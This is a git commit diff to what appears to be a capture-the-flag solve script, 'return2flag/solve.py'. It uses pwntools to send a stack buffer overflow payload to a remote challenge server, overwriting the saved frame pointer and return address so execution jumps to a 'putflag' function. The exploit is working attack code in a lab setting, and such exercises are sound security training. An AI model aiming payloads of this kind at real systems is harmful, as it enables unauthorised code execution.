573587d7b3a49131773d968c4fff01a72087593d
lon <lon@cscap.myguest.virtualbox.org>
2023-06-05 12:56:29 +0800

    change stack structure

--- return2flag/solve.py
+++ return2flag/solve.py
@@ -11,9 +11,11 @@ if __name__ == '__main__':
         port = int(sys.argv[2])
         target = pwn.remote(server, port)  # Connect to the server
 
+    rbp = pwn.p64(0x7fffffffdd50)
     return_addr = pwn.p64(0x401a11)
+    endbr = pwn.p64(0x4a3e10)
     putflag_addr = pwn.p64(0x4017f5)
-    attack = b'0' * 24 + return_addr + b'0' * 8 + putflag_addr 
+    attack = b'0' * 16 + rbp + return_addr + endbr + putflag_addr
     target.sendline(attack)
     a = target.recvuntil(b'?')
     print(target.recvall().decode("utf-8", "ignore").strip())
